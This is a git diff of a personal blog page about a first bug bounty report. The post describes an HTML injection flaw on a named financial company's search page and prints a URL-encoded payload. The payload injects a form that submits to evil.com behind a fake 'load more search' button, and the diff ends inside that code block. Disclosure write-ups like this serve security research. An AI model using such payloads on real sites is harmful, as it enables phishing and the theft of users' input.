@@ -109,6 +109,7 @@
       "headline": "First Bug Report: HTML Injection Vulnerability 🔍",
       "description": "My first bug bounty experience discovering an HTML Injection vulnerability on Prudential Financial through HackerOne. Learn about the impact and findings.",
       "url": "https://jooexploit.dev/blog/first-bug-report-html-injection/",
+      "image": "https://jooexploit.dev/images/og_preview.png",
       "datePublished": "2024-09-02",
       "dateModified": "2024-09-02",
       "author": {
@@ -230,7 +231,7 @@
         
         
           <section class="post-content prose" dir="auto">
-            <h1 id="first-bug-report-html-injection-vulnerability">🔍 First Bug Report: HTML Injection Vulnerability 🕵️‍♂️</h1><p>I’m excited to share my first bug report experience with the community! 🚀</p>
+            <h2 id="first-bug-report-html-injection-vulnerability">🔍 First Bug Report: HTML Injection Vulnerability 🕵️‍♂️</h2><p>I’m excited to share my first bug report experience with the community! 🚀</p>
 <p>Vulnerability: HTML Injection<br>Affected Site: <a href="https://www.prudential.com/common/findfinancialprofessional?type=bylocation&term=">Prudential Financial</a><br>Issue: Improper handling of user input allows for the injection of malicious HTML code.</p>
 <p>Details:<br>The vulnerability was found in the input field of the page. By injecting the following payload, an attacker could potentially manipulate content, steal user data, or phish users:</p>
 <div class="md-code-wrap"><pre><code>%3 C/strong%3 E%3 Cform%20 action=%22//evil.com%22%20 method=%22 GET%22%3 E%3 Cinput%20 type=%22 text%22%20 name=%22 jo%22%20 style=%27 opacity:0;%27%3 E%3 Cinput%20 type=%22 submit%22%20 name=%22 joo%22%20 value=%22 load%20 more%20 search%22%3 E
